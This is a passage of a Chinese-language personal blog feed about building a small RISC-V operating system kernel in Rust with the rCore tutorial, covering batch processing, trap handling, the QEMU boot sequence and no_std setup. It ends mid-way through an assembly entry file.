class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">//! The main module and entrypoint</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! Various facilities of the kernels are implemented as submodules. The most</span><br><span class="hljs-comment">//! important ones are:</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! - [`trap`]: Handles all cases of switching from userspace to the kernel</span><br><span class="hljs-comment">//! - [`syscall`]: System call handling and implementation</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! The operating system also starts in this module. Kernel code starts</span><br><span class="hljs-comment">//! executing from `entry.asm`, after which [`rust_main()`] is called to</span><br><span class="hljs-comment">//! initialize various pieces of functionality. (See its source code for</span><br><span class="hljs-comment">//! details.)</span><br><span class="hljs-comment">//!</span><br><span class="hljs-comment">//! We then call [`batch::run_next_app()`] and for the first time go to</span><br><span class="hljs-comment">//! userspace.</span><br><br><span class="hljs-meta">#![deny(missing_docs)]</span><br><span class="hljs-meta">#![deny(warnings)]</span><br><span class="hljs-meta">#![no_main]</span><br><span class="hljs-meta">#![no_std]</span><br><br><span class="hljs-keyword">use</span> core::arch::global_asm;<br><span class="hljs-keyword">use</span> log::*;<br><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">mod</span> console;<br><span class="hljs-keyword">mod</span> lang_items;<br><span class="hljs-keyword">mod</span> logging;<br><span class="hljs-keyword">mod</span> sbi;<br><span class="hljs-keyword">mod</span> sync;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">mod</span> syscall;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">mod</span> batch;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">mod</span> trap;<br><br>global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;entry.asm&quot;</span>));<br>global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;link_app.S&quot;</span>));<br><br><span class="hljs-comment">/// clear BSS segment</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">clear_bss</span>() &#123;<br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sbss</span>();<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ebss</span>(); <br>    &#125;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        core::slice::<span class="hljs-title function_ invoke__">from_raw_parts_mut</span>(sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>, ebss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> - sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>)<br>            .<span class="hljs-title function_ invoke__">fill</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/// the rust entry-point of os</span><br><span class="hljs-meta">#[unsafe(no_mangle)]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rust_main</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">stext</span>(); <span class="hljs-comment">// begin addr of text segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">etext</span>(); <span class="hljs-comment">// end addr of text segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">srodata</span>(); <span class="hljs-comment">// start addr of Read-Only data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">erodata</span>(); <span class="hljs-comment">// end addr of Read-Only data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sdata</span>(); <span class="hljs-comment">// start addr of data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">edata</span>(); <span class="hljs-comment">// end addr of data segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sbss</span>(); <span class="hljs-comment">// start addr of BSS segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ebss</span>(); <span class="hljs-comment">// end addr of BSS segment</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">boot_stack_lower_bound</span>(); <span class="hljs-comment">// stack lower bound</span><br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">boot_stack_top</span>(); <span class="hljs-comment">// stack top</span><br>    &#125;<br>    <span class="hljs-title function_ invoke__">clear_bss</span>();<br>    logging::<span class="hljs-title function_ invoke__">init</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello roxy! I am kernel, your friend! Congratulations! You succeed in constructing a batch system!&quot;</span>);<br>    trace!(<br>        <span class="hljs-string">&quot;[kernel] .text [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        stext <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, etext <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    debug!(<br>        <span class="hljs-string">&quot;[kernel] .rodata [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        srodata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, erodata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    info!(<br>        <span class="hljs-string">&quot;[kernel] .data [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>,<br>        sdata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, edata <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    warn!(<br>        <span class="hljs-string">&quot;[kernel] boot_stack top=bottom=&#123;:#x&#125;, lower_bound=&#123;:#x&#125;&quot;</span>,<br>        boot_stack_top <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, boot_stack_lower_bound <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span><br>    );<br>    error!(<span class="hljs-string">&quot;[kernel] .bss [&#123;:#x&#125;, &#123;:#x&#125;)&quot;</span>, sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, ebss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br><br>    trap::<span class="hljs-title function_ invoke__">init</span>();<br>    batch::<span class="hljs-title function_ invoke__">init</span>();<br>    batch::<span class="hljs-title function_ invoke__">run_next_app</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>操作系统依旧先清零<code>.bss</code>段，打印日志</p><p>随后初始化trap和batch</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// trap init</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>() &#123;<br>    <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        safe <span class="hljs-keyword">fn</span> <span class="hljs-title function_">__alltraps</span>();<br>    &#125;<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        stvec::<span class="hljs-title function_ invoke__">write</span>(__alltraps <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, TrapMode::Direct);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// batch init</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">init</span>() &#123;<br>    <span class="hljs-title function_ invoke__">print_app_info</span>();<br>&#125;<br><br><span class="hljs-comment">/// print apps info</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_app_info</span>() &#123;<br>    APP_MANAGER.<span class="hljs-title function_ invoke__">exclusive_access</span>().<span class="hljs-title function_ invoke__">print_app_info</span>();<br>&#125;<br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_app_info</span>(&amp;<span class="hljs-keyword">self</span>) &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;there are &#123;&#125; apps totally!!!&quot;</span>, <span class="hljs-keyword">self</span>.num_app);<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-keyword">self</span>.num_app &#123;<br>            <span class="hljs-built_in">println!</span>(<br>                <span class="hljs-string">&quot;[kernel] app_&#123;&#125; range [&#123;:#x&#125;, &#123;:#x&#125;)!&quot;</span>,<br>                i,<br>                <span class="hljs-keyword">self</span>.app_start[i],<br>                <span class="hljs-keyword">self</span>.app_start[i + <span class="hljs-number">1</span>]<br>            );<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来便是上面的<code>run_next_app</code></p><p>先<code>exclusive_access</code>，然后分别<code>get_current_app</code>，<code>load_app</code>，<code>move_to_next_app</code>，<code>drop</code></p><p>需要注意的是，<code>load_app</code>仅完成将应用程序的代码加载到对应的内存地址，还并未真正执行</p><p>在<code>__resotre</code>的<code>sret</code>之后才会开始执行我们的第一个应用程序</p><p>随后便是在<code>hello_world.rs</code>和<code>power.rs</code>中测试系统调用的过程:</p><p>syscall -&gt; ecall -&gt; trap -&gt; 保存寄存器 -&gt; trap_handler(kernel) -&gt; 恢复寄存器 -&gt; 继续执行</p><p>即测试os能否正确处理<code>trap</code></p><p>最后exit(main())系统调用以<code>run_next_app</code></p><p>然后<code>store_fault.rs</code>，<code>priv_inst.rs</code>和<code>priv_csr.rs</code>则分别测试3种不同的<strong>异常</strong>，过程:</p><p>CPU异常 -&gt; 自动trap_handler -&gt; kill -&gt; <code>run_next_app</code></p><p>即测试os能否正确处理<code>exception</code></p><p>这样应用程序便会依次执行了~</p><p>综上所述，我们客服重重困难，解决许多问题，终于实现了<em>批处理操作系统</em>，并使应用程序与os特权级别隔离，以处理trap和exception</p><p>这便是全过程了!</p><p>总览:</p><p><img src="/images/66.png" alt="panorama"></p><p>项目结构:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs css">./os/<span class="hljs-attribute">src</span><br>Rust        <span class="hljs-number">13</span> Files   <span class="hljs-number">372</span> Lines<br>Assembly     <span class="hljs-number">2</span> Files    <span class="hljs-number">58</span> Lines<br><br>├── bootloader<br>│   └── rustsbi-qemu<span class="hljs-selector-class">.bin</span><br>├── LICENSE<br>├── os<br>│   ├── build<span class="hljs-selector-class">.rs</span>(新增 : 生成 link_app.S 将应用作为一个数据段链接到内核)<br>│   ├── Cargo.toml<br>│   ├── <span class="hljs-built_in">Makefile</span>(修改 : 构建内核之前先构建应用)<br>│   └── src<br>│       ├── batch.<span class="hljs-built_in">rs</span>(新增 : 实现了一个简单的批处理系统)<br>│       ├── console.rs<br>│       ├── entry.asm<br>│       ├── lang_items.rs<br>│       ├── link_app.<span class="hljs-built_in">S</span>(构建产物 由 os/build.rs 输出)<br>│       ├── linker-qemu.ld<br>│       ├── main.<span class="hljs-built_in">rs</span>(修改 : 主函数中需要初始化 Trap 处理并加载和执行应用)<br>│       ├── sbi.rs<br>│       ├── <span class="hljs-built_in">sync</span>(新增 : 同步子模块 sync 目前唯一功能是提供 UPSafeCell )<br>│       │   ├── mod.rs<br>│       │   └── up.<span class="hljs-built_in">rs</span>(包含 UPSafeCell 它可以帮助我们以更 Rust 的方式使用全局变量)<br>│       ├── <span class="hljs-built_in">syscall</span>(新增 : 系统调用子模块 syscall )<br>│       │   ├── fs.<span class="hljs-built_in">rs</span>(包含文件 I/O 相关的 syscall )<br>│       │   ├── mod.<span class="hljs-built_in">rs</span>(提供 syscall 方法根据 syscall ID 进行分发处理)<br>│       │   └── process.<span class="hljs-built_in">rs</span>(包含任务处理相关的 syscall)<br>│       └── <span class="hljs-built_in">trap</span>(新增 : Trap 相关子模块 trap )<br>│           ├── context.<span class="hljs-built_in">rs</span>(包含 Trap 上下文 TrapContext )<br>│           ├── mod.<span class="hljs-built_in">rs</span>(包含 Trap 处理入口 trap_handler )<br>│           └── trap.<span class="hljs-built_in">S</span>(包含 Trap 上下文保存与恢复的汇编代码)<br>├── README.md<br>├── rust-toolchain<br>└── <span class="hljs-built_in">user</span>(新增 : 应用测例保存在 user 目录下)<br>   ├── Cargo.toml<br>   ├── Makefile<br>   └── src<br>      ├── <span class="hljs-built_in">bin</span>(基于用户库 user_lib 开发的应用 每个应用放在一个源文件中)<br>      │   ├── <span class="hljs-number">00</span>hello_world.rs<br>      │   ├── <span class="hljs-number">01s</span>tore_fault.rs<br>      │   ├── <span class="hljs-number">02</span>power.rs<br>      │   ├── <span class="hljs-number">03</span>priv_inst.rs<br>      │   └── <span class="hljs-number">04</span>priv_csr.rs<br>      ├── console.rs<br>      ├── lang_items.rs<br>      ├── lib.<span class="hljs-built_in">rs</span>(用户库 user_lib )<br>      ├── linker.<span class="hljs-built_in">ld</span>(应用的链接脚本)<br>      └── syscall.<span class="hljs-built_in">rs</span>(包含 syscall 方法生成实际用于系统调用的汇编指令 | 各个具体的 syscall 都是通过 syscall 来实现的)<br></code></pre></td></tr></table></figure><p>最后输出:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">RustSBI output</span>]<br>[<span class="hljs-meta">kernel</span>] Hello, world!<br>[<span class="hljs-meta">kernel</span>] num_app = <span class="hljs-number">5</span><br>[<span class="hljs-meta">kernel</span>] app_0 [<span class="hljs-number">0x8020a038</span>, <span class="hljs-number">0x8020af90</span>)<br>[<span class="hljs-meta">kernel</span>] app_1 [<span class="hljs-number">0x8020af90</span>, <span class="hljs-number">0x8020bf80</span>)<br>[<span class="hljs-meta">kernel</span>] app_2 [<span class="hljs-number">0x8020bf80</span>, <span class="hljs-number">0x8020d108</span>)<br>[<span class="hljs-meta">kernel</span>] app_3 [<span class="hljs-number">0x8020d108</span>, <span class="hljs-number">0x8020e0e0</span>)<br>[<span class="hljs-meta">kernel</span>] app_4 [<span class="hljs-number">0x8020e0e0</span>, <span class="hljs-number">0x8020f0b8</span>)<br>[<span class="hljs-meta">kernel</span>] Loading app_0<br>Hello, world!<br>[<span class="hljs-meta">kernel</span>] Application exited <span class="hljs-keyword">with</span> code <span class="hljs-number">0</span><br>[<span class="hljs-meta">kernel</span>] Loading app_1<br>Into Test store_fault, we will insert an invalid store operation...<br>Kernel should kill <span class="hljs-keyword">this</span> application!<br>[<span class="hljs-meta">kernel</span>] PageFault <span class="hljs-keyword">in</span> application, kernel killed it.<br>[<span class="hljs-meta">kernel</span>] Loading app_2<br><span class="hljs-number">3</span>^<span class="hljs-number">10000</span>=<span class="hljs-number">5079</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">20000</span>=<span class="hljs-number">8202</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">30000</span>=<span class="hljs-number">8824</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">40000</span>=<span class="hljs-number">5750</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">50000</span>=<span class="hljs-number">3824</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">60000</span>=<span class="hljs-number">8516</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">70000</span>=<span class="hljs-number">2510</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">80000</span>=<span class="hljs-number">9379</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">90000</span>=<span class="hljs-number">2621</span>(MOD <span class="hljs-number">10007</span>)<br><span class="hljs-number">3</span>^<span class="hljs-number">100000</span>=<span class="hljs-number">2749</span>(MOD <span class="hljs-number">10007</span>)<br>Test power OK!<br>[<span class="hljs-meta">kernel</span>] Application exited <span class="hljs-keyword">with</span> code <span class="hljs-number">0</span><br>[<span class="hljs-meta">kernel</span>] Loading app_3<br>Try to execute privileged instruction <span class="hljs-keyword">in</span> U Mode<br>Kernel should kill <span class="hljs-keyword">this</span> application!<br>[<span class="hljs-meta">kernel</span>] IllegalInstruction <span class="hljs-keyword">in</span> application, kernel killed it.<br>[<span class="hljs-meta">kernel</span>] Loading app_4<br>Try to access privileged CSR <span class="hljs-keyword">in</span> U Mode<br>Kernel should kill <span class="hljs-keyword">this</span> application!<br>[<span class="hljs-meta">kernel</span>] IllegalInstruction <span class="hljs-keyword">in</span> application, kernel killed it.<br>[<span class="hljs-meta">kernel</span>] Panicked at src/batch.rs:<span class="hljs-number">58</span> All applications completed!<br></code></pre></td></tr></table></figure><p>成功!</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ok啊终于结束了，写代码的时候比较容易，但是想表达出来整个过程还真是困难啊</p><p>希望我能坚持下去吧…</p><p>最近pwn也摆了，后面再拾起吧…</p><p>马上开学了，大一下课程又多又满，不过依旧是”好好上课” 😁😁</p><p>最后逐你生活愉快，天天开心! 😎😎</p><p>感谢阅读… 😛</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>trap</tag>
      
      <tag>内核栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hello kernel!</title>
    <link href="/2026/02/23/hello-kernel/"/>
    <url>/2026/02/23/hello-kernel/</url>
    
    <content type="html"><![CDATA[<h1 id="hello-kernel"><a href="#hello-kernel" class="headerlink" title="hello kernel!"></a>hello kernel!</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>最近被朋友推荐进入了一个vx群，是关于学长前辈们打造的一个项目，从零实现一个操作系统内核，目标是逐步迭代，以实现各种功能，我感觉还是很有意思的，遂打算实践一番，但是发现啊，lab1就把我干倒了，所以我先简化一些步骤，基于别的有详细教程的项目先熟悉一下原理再说</p><p>详情请参考: <a href="https://rcore-os.cn/rCore-Tutorial-Book-v3/">https://rcore-os.cn/rCore-Tutorial-Book-v3/</a></p><p>github仓库: <a href="https://github.com/rcore-os/rCore-Tutorial-v3">https://github.com/rcore-os/rCore-Tutorial-v3</a></p><p>基于<code>rust</code>语言与<code>risc-v</code>架构在<code>QEMU</code>上，从零实现<code>kernel</code>的各种功能，构建一个小型操作系统!</p><p>学长的项目链接: <a href="https://github.com/YatSenOS/YatSenOS-Tutorial-Volume-2">https://github.com/YatSenOS/YatSenOS-Tutorial-Volume-2</a></p><p>指导教程: <a href="https://ysos.gzti.me/">https://ysos.gzti.me/</a></p><p>先来看看什么是QEMU!</p><p>在这之前似乎需要先了解一下真实计算机的加电启动流程</p><p>在你打开电脑电源后</p><p>发生了什么?</p><p>首先，加电(自检)后CPU的PC寄存器被设置为计算机内部只读存储器(ROM Read-only Memory)的物理地址，随后CPU开始运行ROM内的软件，我们一般将该软件称为<code>固件</code>(Firmware)，它的功能是对CPU进行一些初始化操作，将后续阶段的<strong>bootloader</strong>的代码，数据从硬盘载入到物理内存，最后跳转到适当的地址将计算机控制权转移给<code>bootloader</code></p><p>随后，bootloader同样完成一些CPU的初始化工作，然后将操作系统镜像从硬盘加载到物理内存中，最后跳转到适当地址将控制权转移给操作系统</p><p>至此，操作系统彻底接管电脑，向下管理并控制计算机硬件和各种外设，同时向上管理应用软件并提供各种服务，使得计算机能够正确而高效地运行!</p><p>我正是被手写bootloader和ELF parse(elf解析)所击败，所以，先放一放，直接用现有的bootloader~</p><p>而且我才发现这个的是固件是<code>BIOS</code>,而学长提供的是<code>UEFI</code>，似乎<code>UEFI</code>目前为主流选择，不过依旧先忽略</p><p>知识点似乎有点密集，慢慢学吧…</p><p>吐槽: risc-v架构也不是我所熟悉的(x_x)，不过从x86迁移过去还是很容易的，思路是通用的!</p><p>我们先聚焦于写kernel!</p><hr><h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><p>现在来看QEMU!</p><p>它的功能为利用宿主机提供的资源，<code>模拟</code>一台64位risc-v架构的计算机，包含了CPU，物理内存以及若干I&#x2F;O外设</p><p>运行指令参考:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ qemu-system-riscv64 \<br>    -machine virt \<br>    -nographic \<br>    -bios ../bootloader/rustsbi-qemu.bin \<br>    -device loader,file=target/riscv64gc-unknown-none-elf/release/os.bin,addr=0x80200000<br></code></pre></td></tr></table></figure><p>在其模拟的这个virt硬件平台上，我们需要加载预编译好的<code>rustsbi-qemu.bin</code>，即现有的bootloader，以及os.bin，即<strong>内核镜像</strong>，我们先聚焦于此</p><p>与真实计算机类似，运行上述命令后，其会模拟这样一个过程</p><p>首先将必要的文件载入到QEMU的物理内存之后，QEMU CPU的程序计数器(PC)会被初始化为<code>0x1000</code>(固件firmware)，因此QEMU实际执行的第一条指令位于物理地址<code>0x1000</code>，接下来它将执行寥寥数条指令并跳转到物理地址<code>0x80000000</code>对应的指令处，因此我们需要将负责<code>bootloader</code>的<code>rustsbi-qemu.bin</code>放在以物理地址<code>0x80000000</code>开头的物理内存中，这样就能保证<code>0x80000000</code>处正好保存<code>bootloader</code>的第一条指令!</p><p>随后<code>bootloader</code>负责对计算机进行一些初始化工作，并跳转到下一阶段软件的入口，在QEMU上即可实现将计算机控制权移交给我们的内核镜像<code>os.bin</code>，我们选用的<code>RustSBI</code>是将下一阶段的入口地址预先约定为固定的<code>0x80200000</code>，所以在<code>RustSBI</code>的初始化工作完成之后，它会跳转到该地址并将计算机控制权移交给下一阶段的软件，即我们的内核镜像</p><p>为了正确地和上一阶段的<code>RustSBI</code>对接，我们需要保证内核的第一条指令位于物理地址<code>0x80200000</code>处，为此，我们需要将内核镜像预先加载到QEMU物理内存以地址<code>0x80200000</code>开头的区域上，一旦CPU开始执行内核的第一条指令，证明计算机的控制权已经被移交给我们的内核!</p><p>这样其执行流就为我们所控了，现在我们可以开始编写内核代码了!</p><p>ps: 似乎有点啰嗦，见谅! ( ´•̥̥̥ω•̥̥̥&#96; )</p><p>启动!</p><p>先从打印<code>hello world</code>开始!</p><hr><h2 id="先跑起来再说"><a href="#先跑起来再说" class="headerlink" title="先跑起来再说"></a>先跑起来再说</h2><p>众所周知，在c语言中这是很简单的事情，但是实际上这是因为有着多层硬件和软件工具和支撑环境隐藏在它背后，才让我们不必付出那么多努力就能够创造出功能强大的应用程序</p><p>但由于我们这个是建立在裸机(bare metal)上的执行环境，所以我们没有编译器，运行时库和操作系统的支持</p><p>一切都得从零开始…</p><p><img src="/images/60.png" alt="应用程序执行环境栈"></p><p>所以目前并没有<code>println!</code>宏供我们使用，我们先看看怎样至少能让应用跑起来，先注释掉<code>println!(&quot;hello world&quot;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cargo build<br>   Compiling os v0.1.0 (/home/shinbokuow/workspace/v3/rCore-Tutorial-v3/os)<br>error: `#[panic_handler]` <span class="hljs-keyword">function</span> required, but not found<br></code></pre></td></tr></table></figure><p>在使用rust编写应用程序的时候，我们常常在遇到了一些无法恢复的致命错误(panic)，导致程序无法继续向下运行</p><p>这时手动或自动调用<code>panic!</code>宏来打印出错的位置，让软件能够意识到它的存在，并进行一些后续处理，在标准库<code>std</code>中提供了关于<code>panic!</code>宏的具体实现，然而我们也并没有</p><p>因此我们通过<code>#[panic_handler]</code>这种编译指导属性自己实现一个简陋的panic处理函数</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/lang_items.rs</span><br><span class="hljs-keyword">use</span> core::panic::PanicInfo;<br><br><span class="hljs-meta">#[panic_handler]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">panic</span>(_info: &amp;PanicInfo) <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">loop</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-keyword">mod</span> lang_items;<br><span class="hljs-comment">// ... other code</span><br></code></pre></td></tr></table></figure><p>再次编译，又产生了新的问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cargo build<br>      Compiling os v0.1.0 (/home/shinbokuow/workspace/v3/rCore-Tutorial-v3/os)<br>   error: requires `start` lang_item<br></code></pre></td></tr></table></figure><p>编译器提醒我们缺少一个名为<code>start</code>的语义项</p><p>语言标准库和三方库作为应用程序的执行环境，需要负责在执行应用程序之前进行一些初始化工作，然后才跳转到应用程序的入口点(也就是跳转到我们编写的main函数)开始执行</p><p>事实上start语义项代表了标准库<code>std</code>在执行应用程序之前需要进行的一些初始化工作，由于我们禁用了标准库，编译器也就找不到这项功能的实现了</p><p>因此我们直接不让编译器使用这项功能</p><p>我们在main.rs的开头加入设置<code>#![no_main]</code>告诉编译器我们没有一般意义上的main函数，并将原来的main函数删除</p><p>在失去了main函数的情况下，编译器也就不需要完成所谓的初始化工作了~</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">$ cargo build<br>   Compiling os v0<span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span> (/home/shinbokuow/workspace/v3/rCore-Tutorial-v3/os)<br>    Finished dev <span class="hljs-selector-attr">[unoptimized + debuginfo]</span> <span class="hljs-built_in">target</span>(s) in <span class="hljs-number">0.06s</span><br></code></pre></td></tr></table></figure><p>至此，编译成功…</p><p>我们脱离了标准库，通过了编译器的检验，但距离打印<code>hello world</code>似乎还有一定距离</p><p>接下来我们会以自己的方式来重塑这些基本功能，并最终完成我们的目标!</p><hr><h2 id="调试与验证"><a href="#调试与验证" class="headerlink" title="调试与验证"></a>调试与验证</h2><p>首先我们需要编写进入内核后的第一条指令，方便我们验证我们的内核镜像是否正确对接到QEMU上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm"># os/src/entry.asm<br>    .section .text.entry<br>    .globl _start<br>_start:<br>    li x1, 